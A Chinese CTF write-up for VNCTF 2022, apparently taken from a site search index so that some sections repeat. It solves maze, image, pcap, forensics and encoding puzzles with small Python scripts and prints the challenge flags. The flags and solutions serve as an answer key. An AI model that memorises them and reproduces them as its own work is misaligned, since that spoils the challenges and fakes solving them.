POP_JUMP_IF_FALSE 40 0 LOAD_GLOBAL 0 ( print ) 2 LOAD_CONST 4 ( 'Congratulation! flag: VNCTF{md5(your input)}' ) 4 CALL_FUNCTION 1 6 POP_TOP 8 JUMP_FORWARD 8 ( to 48 ) \u6240\u4ee5\u5927\u6982\u610f\u601d\u5c31\u662f\u6709\u4e00\u4e2a 31*31 \u5217\u8868\u6784\u6210\u7684 _map \u5730\u56fe\uff0c1 \u662f\u5899\uff0c0 \u53ef\u4ee5\u8d70\uff0c5 \u662f\u81ea\u5df1\uff0c\u8981\u5230\u8fbe 7 \u5e76\u4e14\u901a\u8fc7 wasd \u64cd\u7eb5\u65b9\u5411\uff0c\u5230\u8fbe 7 \u7684\u6240\u6709\u8f93\u5165\u518d md5 \u5c31\u662f flag \u6240\u4ee5\u76f4\u63a5\u6b63\u5219\u63d0\u53d6\u5217\u8868\uff0c\u7136\u540e\u6253\u5370\u51fa\u6765\u624b\u52a8\u505a\u4e00\u4e0b\u5c31\u597d import re with open ( \"maze.pyc\" , \"r\" ) as f : content = f . read () res = re . findall ( \"(?:LOAD_CONST.*?\\((\\d)\\))\" , content , re . S ) print ( res ) ptr = 0 for i in range ( 31 ): for j in range ( 31 ): if res [ ptr ] == \"1\" : print ( \"\u2588\" , end = \"\" ) else : print ( \" \" , end = \"\" ) ptr += 1 print () \u7ed3\u679c \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588 \u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588\u2588\u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588 \u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 ssssddssaassddddwwwwddwwddddddwwddddddssddwwddddddddssssaawwaassaassaassddssaassaawwwwwwaaaaaaaassaassddddwwddssddssssaassddssssaaaaaawwddwwaawwwwaassssssssssssddddssddssddddddddwwaaaaaawwwwddssddwwwwwwwwddssddssssssssddddss VNCTF{801f190737434100e7d2790bd5b0732e} \u4ed4\u7ec6\u627e\u627e \u00b6 \u9898\u76ee \u5f88\u660e\u663e\u80fd\u53d1\u73b0\u6709\u50cf\u7d20\u683c\u70b9\uff0c\u5e76\u4e14\u6709\u4e00\u4e9b\u989c\u8272\u4e0d\u4e00\u6837\uff0c\u53ef\u80fd\u662f flag \u4e8e\u662f\u6253\u7b97\u63d0\u53d6\u51fa\u6240\u6709\u683c\u70b9\uff0c\u4f46\u662f\u597d\u50cf\u662f\u5206\u5757\u7684\uff0c\u4e0d\u80fd\u4e00\u6b21\u6027\u5b8c\u6574\u63d0\u53d6 \u4e8e\u662f\u5c31\u8089\u773c\u786c\u770b\uff0c\u5f97\u5230 flag\uff1a vnctf{34aE@w} \u770b\u4e86 wp\uff0c\u662f\u7f29\u653e\u5927\u5c0f\u91cd\u65b0\u91c7\u6837\uff1a from PIL import Image img = Image . open ( \"flag.png\" ) img = img . resize (( 79 , 71 ), Image . NEAREST ) img . show () \u5c31\u80fd\u6e05\u6670\u770b\u5230 flag \u4e86 Strange flag \u00b6 \u4e00\u4e2a\u6d41\u91cf\u5305\uff0cwireshark \u6253\u5f00\uff0c\u8ffd\u8e2a\u6700\u540e\u4e00\u4e2a TCP \u6d41 \u8bfb\u4e00\u4e0b\u8bf7\u6c42\uff0c\u53d1\u73b0\u662f\u8fdb\u5165\u5230\u4e86 flag \u76ee\u5f55\u4e0b\u6267\u884c\u4e86 tree \u547d\u4ee4 \u5f97\u5230\u7684 response \u662f gzip \u538b\u7f29\u540e\u7684\uff0c\u53d6\u51fa\u5185\u5bb9\uff0c\u7136\u540e\u89e3\u538b\u5f97\u5230 tree \u7684\u7ed3\u679c\uff1a flag `-- New\\ folder |-- New\\ folder | |-- New\\ folder | |-- New\\ folder\\ (2) | |-- New\\ folder\\ (3) | `-- New\\ folder\\ (4) `-- New\\ folder\\ (2) |-- New\\ Folder\\ (3) | |-- New\\ folder | | |-- New\\ folder | | | |-- New\\ folder | | | |-- New\\ folder(2) | | | | `-- New\\ folder | | | |-- New\\ folder(3) | | | | `-- New\\ folder | | | `-- New\\ folder(4) | | | `-- New\\ folder | | `-- New\\ folder(2) | | |-- New\\ folder | | |-- New\\ folder(2) | | | `-- New\\ folder | | |-- New\\ folder(3) | | | `-- New\\ folder | | `-- New\\ folder(4) | |-- New\\ folder(10) ... \u4e0d\u96be\u53d1\u73b0\uff0c\u662f\u4e00\u5806\u7a7a\u6587\u4ef6\u5939\u5f62\u6210\u7684\u7ed3\u6784 \u7136\u540e\u5c31\u56de\u60f3\u8d77\u4e86\u4e4b\u524d\u770b\u5230\u7684\u4e00\u79cd esolang \u53eb Folders\uff0c\u662f\u901a\u8fc7\u4e00\u5806\u5d4c\u5957\u7684\u7a7a\u6587\u4ef6\u5939\u7f16\u5199\u7684\uff0c\u8fd9\u4e2a\u53ef\u80fd\u5c31\u662f \u5148\u91cd\u5efa\u8d77\u8fd9\u4e2a\u76ee\u5f55\u7ed3\u6784\uff0c\u6ca1\u627e\u5230\u9006 tree \u7684\u73b0\u6210\u5de5\u5177\uff0c\u53ea\u597d\u624b\u5199\u4e00\u4e2a\u4e86\uff1a import os from pathlib import Path with open ( \"test\" , \"r\" ) as f : tree = f . readlines () path = Path ( \"flag\" ) last_level = - 1 for each in tree : level = each . find ( \"N\" ) // 4 if level < last_level : path = path . parent if level == last_level : path = path . parent diff = last_level - level for _ in range ( diff ): path = path . parent path = path / each . strip () . replace ( \" \\\\ \" , \"\" ) last_level = level os . makedirs ( path ) \u67e5\u4e86\u4e0b\uff0cFolders \u6709\u5de5\u5177\uff0cpip install Folders\uff0c\u7136\u540e Folders flag/\uff0c\u5f97\u5230 flag\uff1a vnctf{d23903879df57503879bcdf1efc141fe} prize wheel \u00b6 \u5dee\u4e00\u70b9\uff0c\u6700\u540e\u7684\u56fe\u7247\u9006\u8fc7\u53bb\u7684\u601d\u8def\u5b8c\u5168\u9519\u4e86 \u9996\u5148\u7ed9\u4e86\u4e00\u4e2a exe\uff0c\u5f00\u59cb\u4e5f\u6ca1\u610f\u8bc6\u5230\u8fd9\u4e2a\u662f\u62bd\u5956\uff0c\u89c4\u5219\u4e5f\u6ca1\u770b\uff0c\u968f\u4fbf\u8dd1\u4e86\u8dd1\u5c31\u62ff\u5230\u4e86\u538b\u7f29\u5305\u5bc6\u7801 f6a623a2c577de3b46c079267d4bdd6e \u518d\u7ec6\u770b\u53d1\u73b0\u662f 0.5% \u7684\u6982\u7387\u80fd\u62bd\u5230\u5bc6\u7801\uff0c\u9884\u671f\u662f\u81ea\u52a8\u5316\u62bd\u5956\u6216\u8005\u9006\u5411\uff0c\u7ed3\u679c\u6211\u4e09\u6b21\u5c31\u62bd\u51fa\u6765\u4e86\uff1f\uff1f\uff08\u6b27\u5728\u4e86\u4e0d\u9700\u8981\u7684\u5730\u65b9.jpg\uff09 \u5145\u6ee1\u5e0c\u671b\u7684\u5f71\u50cf\uff08 \u538b\u7f29\u5305\u89e3\u5f00\u4e4b\u540e\u5f97\u5230\u53e6\u4e00\u4e2a\u56fe\u7247 \u9898\u76ee \u5f88\u660e\u663e\u5e94\u8be5\u662f\u4e00\u5f20\u56fe\u7247\u63d0\u53d6\u51fa\u4e86\u6240\u6709\u50cf\u7d20\u70b9\uff0c\u7136\u540e\u86c7\u5f62\u91cd\u65b0\u6392\u5217\u5f62\u6210\u8fd9\u5f20\u56fe\u7247 \u9898\u76ee hint \u4e5f\u8bf4\u4e86\u5b58\u5728\u53ef\u4ee5\u5b9a\u4f4d\u7684\u4e1c\u897f\uff0c\u80af\u5b9a\u662f\u90a3\u4e9b\u767d\u70b9 \u4f46\u662f\u6211\u7684\u5199\u6cd5\u600e\u4e48\u6837\u90fd\u4e0d\u4f1a\u8ba9\u8fd9\u4e9b\u5bf9\u5728\u4e00\u8d77 \u6211\u7684\u60f3\u6cd5\u662f\u86c7\u5f62\u63d0\u53d6\u51fa\u6240\u6709\u50cf\u7d20\u70b9\uff0c\u7136\u540e\u6309\u7167\u987a\u5e8f\u4ece\u4e0a\u5230\u4e0b\u4ece\u5de6\u5230\u53f3\u586b\u5165 \u6211\u7684\u5199\u6cd5 from PIL import Image from tqdm import tqdm import sys img = Image . open ( \"flag.png\" ) width , height = img . size res = Image . new ( \"RGBA\" , ( 1220 , 1220 )) lst = [] for i in range ( width // 2 + 1 ): for j in range ( i , width - i ): lst . append ( img . getpixel (( i , j ))) for j in range ( i + 1 , width - i ): lst . append ( img . getpixel (( j , width - i - 1 ))) for j in range ( width - i - 2 , i , - 1 ): lst . append ( img . getpixel (( width - i - 1 , j ))) for j in range ( width - i - 1 , i , - 1 ): lst . append ( img . getpixel (( j , i ))) lst = lst [:: - 1 ] with tqdm ( total = 600 ) as pbar : for times in range ( 600 ): ptr = 0 res = Image . new ( \"RGBA\" , ( 610 , 1221 )) for j in range ( 1220 ): for i in range ( width - times ): try : res . putpixel (( i , j ), lst [ ptr ]) ptr += 1 except : pass pbar . update ( 1 ) res . save ( f \"res/- { times } .png\" ) \u6362\u4e86\u597d\u591a\u79cd\u987a\u5e8f\uff0c\u5bfc\u51fa\u4e86\u4e00\u5343\u591a\u5f20\u56fe\u7247\u4e5f\u6ca1\u6709\u957f\u5f97\u597d\u770b\u7684 \u770b\u4e86 wp\uff0c\u77e5\u9053\u4e86\u6bcf\u4e00\u4e2a\u6b63\u65b9\u5f62\u7684\u5708\u4e0a\u90fd\u6709\u4e00\u4e2a\u767d\u8272\u7684\u70b9\uff0c\u8981\u65cb\u8f6c\u6bcf\u4e00\u5708\uff0c\u8ba9\u767d\u8272\u7684\u70b9\u5bf9\u6210\u4e00\u6761\u7ebf \u6240\u4ee5\u9700\u8981\u5199\u811a\u672c\u6765\u65cb\u8f6c\u6bcf\u4e00\u4e2a\u6b63\u65b9\u5f62\u7684\u5708\u76f4\u5230\u5bf9\u9f50\uff1a \u6b63\u89e3 from PIL import Image img = Image . open ( 'flag.png' ) width , height = img . size c_x = width // 2 c_y = height // 2 for count in range ( 3 , width + 1 , 2 ): print ( count ) d = count // 2 for i in range (( count - 1 ) * 4 ): p_x = c_x - d p_y = c_y - d tmp0 = img . getpixel (( width // 2 , c_y - count // 2 )) if tmp0 [ 0 ] == 255 and tmp0 [ 1 ] == 255 and tmp0 [ 2 ] == 255 : break tmp = img . getpixel (( p_x , p_y )) for j in range ( count - 1 ): img . putpixel (( p_x , p_y ), ( img . getpixel (( p_x + 1 , p_y )))) p_x += 1 for j in range ( count - 1 ): img . putpixel (( p_x , p_y ), ( img . getpixel (( p_x , p_y + 1 )))) p_y += 1 for j in range ( count - 1 ): img . putpixel (( p_x , p_y ), ( img . getpixel (( p_x - 1 , p_y )))) p_x -= 1 for j in range ( count - 2 ): img . putpixel (( p_x , p_y ), ( img . getpixel (( p_x , p_y - 1 )))) p_y -= 1 img . putpixel (( p_x , p_y ), tmp ) img . save ( \"trueflag.png\" ) simple macos \u00b6 \u4e5f\u662f\u5dee\u4e00\u70b9\uff0c\u770b\u9519\u9690\u5199\u7684\u56fe\u7247\u6587\u4ef6\u4e86\uff0c\u505a\u4e86\u534a\u5929\u505a\u4e0d\u51fa\u6765 macOS \u53d6\u8bc1\uff0c\u7ed9\u7684\u538b\u7f29\u5305\u662f System \u548c Users \u6587\u4ef6\u5939\u7684\u4e00\u90e8\u5206 \u5168\u5c40\u641c\u7d22 flag\uff0c\u53d1\u73b0 /Users/scr1pt/Librarys/Mail/V9/.../[Gmail].mbox/\u5df2\u5220\u9664\u90ae\u4ef6.mbox/ \u4e2d\u6709\u4e00\u4e2a 603.emlx \u6587\u4ef6\uff0c\u662f\u4e00\u5c01\u5220\u9664\u6389\u7684\u90ae\u4ef6 \u7528 mac \u90ae\u4ef6\u5ba2\u6237\u7aef\u5c31\u80fd\u76f4\u63a5\u6253\u5f00\uff1a \u7136\u540e\u53bb\u627e\u8bf4\u7684 profile picture\uff0c\u53d1\u73b0\u6709\u4e09\u4e2a\u6587\u4ef6\u91cc\u6709\u7c7b\u4f3c\u56fe\u7247\u7684 base64: /System/Volumes/Preboot/79FABCCE-3636-4266-A6CF-8E3BB40332B4/var/db/CryptoUserInfo.plist /System/Volumes/Preboot/79FABCCE-3636-4266-A6CF-8E3BB40332B4/System/Library/Caches/com.apple.corestorage/EncryptedRoot.plist.wipekey /System/Volumes/Preboot/79FABCCE-3636-4266-A6CF-8E3BB40332B4/var/db/AllUsersInfo.plist \u7b2c\u4e00\u4e2a\u662f\u82b1\u56ed\u5b9d\u5b9d\u7684\u4e00\u4e2a\u89d2\u8272 jpeg \u56fe\u7247\uff0c\u7b2c\u4e8c\u4e2a\u662f\u4e00\u6735\u8377\u82b1\u7684 tiff \u56fe\u7247\uff0c\u7b2c\u4e09\u4e2a\u662f\u4e00\u4e2a\u538b\u7f29\u5305\uff0c\u89e3\u538b\u4e4b\u540e\u6709\u4e00\u5806\u8377\u82b1\u56fe\u7247\u7684\u4e0d\u540c\u6837\u5f0f\uff08\u5927\u5c0f\u8fb9\u6846\u6587\u5b57\u4e4b\u7c7b\uff09 \u7136\u540e\u6211\u5c31\u53bb\u770b\u90a3\u4e2a tiff \u4e86\uff0c\u4ec0\u4e48\u90fd\u770b\u4e0d\u51fa\u6765 \u770b\u4e86 wp\uff0c\u662f\u5728\u7b2c\u4e00\u4e2a\u56fe\u7247\u4e2d\u9690\u85cf\u7684\u4fe1\u606f \u6587\u4ef6\u672b\u5c3e\u6709\u4e00\u4e32 flag \u7684\u7ed3\u5c3e nsllc_1s_s1MMple} \uff08\u4e0d\u592a\u786e\u5b9a\uff09 \u7136\u540e\u518d\u53bb\u6389\u8fd9\u4e00\u4e32\uff0c\u653e\u5230 Our Secret \u4e2d\u8bfb\u53d6\uff0c\u5f31\u5bc6\u7801 123456\uff0c\u5f97\u5230\u524d\u534a\u90e8\u5206 flag: VNCTF{Macos_Fore","title":"VNCTF 2022"},{"location":"writeups/vnctf2022/#vnctf-2022-writeup","text":"Abstract \u5bd2\u5047\u91cc\u7684\u4e00\u573a\u4e2a\u4eba\u8d5b\uff0c\u968f\u4fbf\u6253\u7740\u73a9\u4e86\u73a9\uff0c\u505a\u4e86\u51e0\u4e2a misc\uff0c\u548c\u50cf misc \u7684 web/rev/crypto\uff0c\u6392\u4e86 35 \u6709\u51e0\u9053\u9898\u5dee\u70b9\u5c31\u80fd\u505a\u51fa\u6765\uff0c\u8fd9\u91cc\u4e5f\u90fd\u5199\u4e0b\u6765\u4e86 VNCTF 2022 Official WriteUp","title":"VNCTF 2022 Writeup"},{"location":"writeups/vnctf2022/#gamev40","text":"web \u7c7b\u578b\u7684\u7b7e\u5230\u9898 \u5f00\u59cb\u8fd8\u53bb\u8ba4\u771f\u5730\u73a9\u4e86\u8fd9\u4e2a\u6e38\u620f\uff0c\u7136\u540e\u6253\u5b8c flag \u5173\u4e5f\u6ca1\u6709\u770b\u5230 flag\uff0c\u5c31\u53bb\u7ffb\u4e86\u6e90\u7801 \u53d1\u73b0\u4e86 data.js \u8fd9\u4e2a\u6587\u4ef6\u4fdd\u5b58\u4e86\u6240\u6709\u5173\u5361\u7684\u6570\u636e\uff0c\u7136\u540e\u5728\u6587\u4ef6\u7684\u6700\u672b\u5c3e\u6709\u4e00\u884c \"ZmxhZw==\" : \"Vk5DVEYlN0JXZWxjb21lX3RvX1ZOQ1RGMjAyMiU3RA==\" base64 \u89e3\u7801\uff0c\u7136\u540e URL \u89e3\u7801\uff0c\u5f97\u5230\uff1aflag: VNCTF{Welcome_to_VNCTF2022}","title":"GameV4.0"},{"location":"writeups/vnctf2022/#gocalc0","text":"\u770b\u6837\u5b50\u662f\u975e\u9884\u671f\u4e86 \u70b9\u8fdb flag \u5728\u8fd9\u91cc\uff0c\u91cc\u9762\u8bf4 flag is in your session\uff0c\u6253\u5f00 cookies \u53d1\u73b0\uff1a session: MTY0NDk4ODEyMnxEdi1CQkFFQ180SUFBUkFCRUFBQVNQLUNBQUVHYzNSeWFXNW5EQVlBQkVaTVFVY0djM1J5YVc1bkRDd0FLbVpzWVdkN01EWXlZamcyWlRNdE1tSTFNaTAwTURFMUxUZzJNall0TjJFNVkyVTVORFV4TldZMGZRPT18sud3sUmK5woUfaXQnzZ_R_eu8wGDMVPjfgXvyKo99os= base64 \u89e3\u7801\u540e\u53d1\u73b0\u91cc\u9762\u8fd8\u6709\u4e00\u6bb5 base64\uff0c\u7ee7\u7eed\u89e3\u7801\uff0c\u5c31\u6709 flag \u4e86\uff1a flag{062b86e3-2b52-4015-8626-7a9ce94515f4}","title":"gocalc0"},{"location":"writeups/vnctf2022/#ezmath","text":"\u4e00\u9053\u6ca1\u4ec0\u4e48\u542b\u91d1\u91cf\u7684 crypto \u9898\u76ee\u95ee\u7b2c x \u4e2a\u6ee1\u8db3 \\((2^n-1)\\equiv 0\\pmod{15}\\) \u7684 n\uff0c\u5e76\u4e14\u5728\u4e00\u5206\u949f\u4e4b\u5185\u56de\u7b54 777 \u6b21 \u53ef\u4ee5\u53d1\u73b0\u8fd9\u91cc\u7684 n \u4e00\u5b9a\u662f 4 \u7684\u500d\u6570\uff0c\u800c\u4e14\u662f\u5145\u8981\u7684\uff0c\u6240\u4ee5\u76f4\u63a5\u8bfb\u5165\u7136\u540e\u4e58 4 \u518d\u56de\u7b54\u5c31\u597d\u4e86","title":"ezmath"},{"location":"writeups/vnctf2022/#babymaze","text":"\u4e00\u9053 python \u7684 rev \u76f4\u63a5 uncompyle6 \u53d1\u73b0\u5361\u6b7b\uff0c\u7136\u540e marshal+dis \u8bfb\u53d6\u5b57\u8282\u7801\u53cd\u7f16\u8bd1 import dis import marshal with open ( \"BabyMaze.pyc\" , \"rb\" ) as f : code = marshal . loads ( f . read ()[ 16 :]) dis . dis ( code ) \u5f97\u5230\u5f00\u5934\uff1a 1 0 JUMP_ABSOLUTE 4 >> 2 JUMP_ABSOLUTE 6 >> 4 JUMP_ABSOLUTE 2 >> 6 LOAD_CONST 0 ( 1 ) ... 66 LOAD_CONST 0 ( 1 ) 68 BUILD_LIST 31 70 LOAD_CONST 0 ( 1 ) 72 LOAD_CONST 1 ( 5 ) 74 LOAD_CONST 0 ( 1 ) ... 130 LOAD_CONST 0 ( 1 ) 132 BUILD_LIST 31 ... ... 1862 LOAD_CONST 0 ( 1 ) 1864 LOAD_CONST 2 ( 0 ) ... 1920 LOAD_CONST 3 ( 7 ) 1922 LOAD_CONST 0 ( 1 ) 1924 BUILD_LIST 31 1926 LOAD_CONST 0 ( 1 ) ... 1986 LOAD_CONST 0 ( 1 ) 3 1988 BUILD_LIST 31 1990 BUILD_LIST 31 1992 STORE_NAME 0 ( _map ) \u7ed3\u5c3e\uff1a Disassembly of < code object main at 0x00000222A2AC4660 , file \".\\BabyMaze.py\" , line 23 > : 0 LOAD_GLOBAL 0 ( print ) 2 LOAD_CONST 1 ( 'Welcome To VNCTF2022!!!' ) 4 CALL_FUNCTION 1 6 POP_TOP 8 LOAD_GLOBAL 0 ( print ) 0 LOAD_CONST 2 ( 'Hello Mr. X, this time your mission is to get out of this maze this time.(FIND THAT 7!)' ) 2 CALL_FUNCTION 1 4 POP_TOP 6 LOAD_GLOBAL 0 ( print ) 8 LOAD_CONST 3 ( 'you are still doing the mission alone, this tape will self-destruct in five seconds.' ) 0 CALL_FUNCTION 1 2 POP_TOP 4 LOAD_GLOBAL 1 ( maze ) 6 CALL_FUNCTION 0 8 POP_JUMP_IF_FALSE 40 0 LOAD_GLOBAL 0 ( print ) 2 LOAD_CONST 4 ( 'Congratulation! flag: VNCTF{md5(your input)}' ) 4 CALL_FUNCTION 1 6 POP_TOP 8 JUMP_FORWARD 8 ( to 48 ) \u6240\u4ee5\u5927\u6982\u610f\u601d\u5c31\u662f\u6709\u4e00\u4e2a 31*31 \u5217\u8868\u6784\u6210\u7684 _map \u5730\u56fe\uff0c1 \u662f\u5899\uff0c0 \u53ef\u4ee5\u8d70\uff0c5 \u662f\u81ea\u5df1\uff0c\u8981\u5230\u8fbe 7 \u5e76\u4e14\u901a\u8fc7 wasd \u64cd\u7eb5\u65b9\u5411\uff0c\u5230\u8fbe 7 \u7684\u6240\u6709\u8f93\u5165\u518d md5 \u5c31\u662f flag \u6240\u4ee5\u76f4\u63a5\u6b63\u5219\u63d0\u53d6\u5217\u8868\uff0c\u7136\u540e\u6253\u5370\u51fa\u6765\u624b\u52a8\u505a\u4e00\u4e0b\u5c31\u597d import re with open ( \"maze.pyc\" , \"r\" ) as f : content = f . read () res = re . findall ( \"(?:LOAD_CONST.*?\\((\\d)\\))\" , content , re . S ) print ( res ) ptr = 0 for i in range ( 31 ): for j in range ( 31 ): if res [ ptr ] == \"1\" : print ( \"\u2588\" , end = \"\" ) else : print ( \" \" , end = \"\" ) ptr += 1 print () \u7ed3\u679c \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588 \u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588\u2588\u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588 \u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588 \u2588 \u2588 \u2588 \u2588 \u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 